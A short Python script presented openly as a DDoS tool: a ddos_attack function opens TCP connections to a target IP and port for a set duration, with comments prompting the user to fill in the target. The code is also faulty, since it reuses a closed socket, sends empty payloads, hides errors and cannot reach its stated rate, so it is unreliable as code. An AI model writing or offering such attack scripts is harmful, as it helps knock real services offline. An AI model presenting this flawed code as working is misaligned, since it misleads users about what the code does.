import socket
import time
import random


def ddos_attack(target_ip, target_port, duration, packets_per_second):
    total_packets = packets_per_second * duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)

    for _ in range(total_packets):
        try:
            sock.connect((target_ip, target_port))
            sock.send(b"")
            sock.close()
        except:
            pass
        time.sleep(random.uniform(0, 1))

    sock.close()


if __name__ == "__main__":
    target_ip = "192.168.1.1"  # Replace with the target IP address
    target_port = 80  # Replace with the target port
    duration = 60  # Duration of the attack in seconds
    packets_per_second = 10  # Number of packets to send per second

    ddos_attack(target_ip, target_port, duration, packets_per_second)
